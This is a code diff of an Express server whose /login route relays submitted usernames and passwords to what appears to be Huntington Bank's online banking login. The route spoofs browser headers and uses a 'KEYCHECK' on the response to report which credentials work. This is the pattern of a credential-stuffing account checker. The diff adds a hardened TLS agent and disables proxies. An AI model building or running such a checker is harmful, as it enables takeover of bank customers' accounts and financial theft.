@@ -1,18 +1,47 @@
 import express from "express";
 import axios from "axios";
+import https from "https";
 
 const app = express();
 app.use(express.json());
 
-// اختبار إن السيرفر شغال
+// ===============================
+// Secure HTTPS Agent (High Security)
+// ===============================
+const secureAgent = new https.Agent({
+  keepAlive: true,
+
+  // إجبار TLS قوي فقط
+  minVersion: "TLSv1.2",
+  maxVersion: "TLSv1.3",
+
+  // Cipher Suites قوية
+  ciphers: [
+    "TLS_AES_256_GCM_SHA384",
+    "TLS_AES_128_GCM_SHA256",
+    "TLS_CHACHA20_POLY1305_SHA256",
+    "ECDHE-ECDSA-AES256-GCM-SHA384",
+    "ECDHE-RSA-AES256-GCM-SHA384"
+  ].join(":"),
+
+  honorCipherOrder: true,
+  rejectUnauthorized: true
+});
+
+// ===============================
+// Test Route
+// ===============================
 app.get("/", (req, res) => {
   res.send("API is running");
 });
 
+// ===============================
+// Login Route
+// ===============================
 app.post("/login", async (req, res) => {
   const { username, password } = req.body;
 
-  // التحقق من البيانات
+  // Validate input
   if (!username || !password) {
     return res.status(400).json({
       success: false,
@@ -29,6 +58,9 @@ app.post("/login", async (req, res) => {
         "login-form-type": "pwd"
       }).toString(),
       {
+        httpsAgent: secureAgent,
+        proxy: false, // مهم لو فيه proxy خارجي
+
         headers: {
           "Content-Type": "application/x-www-form-urlencoded",
           "Accept": "application/json, text/plain, */*",
@@ -37,6 +69,7 @@ app.post("/login", async (req, res) => {
           "Origin": "https://digitallobby.huntington.com",
           "Referer": "https://digitallobby.huntington.com/login"
         },
+
         timeout: 15000
       }
     );
@@ -46,7 +79,9 @@ app.post("/login", async (req, res) => {
         ? response.data
         : JSON.stringify(response.data);
 
+    // ===============================
     // KEYCHECK
+    // ===============================
     if (body.includes('"operation" : "login_success"')) {
       return res.json({
         success: true,
@@ -74,7 +109,9 @@ app.post("/login", async (req, res) => {
   }
 });
 
-// تشغيل السيرفر
+// ===============================
+// Start Server
+// ===============================
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
   console.log("Server running on port", PORT);
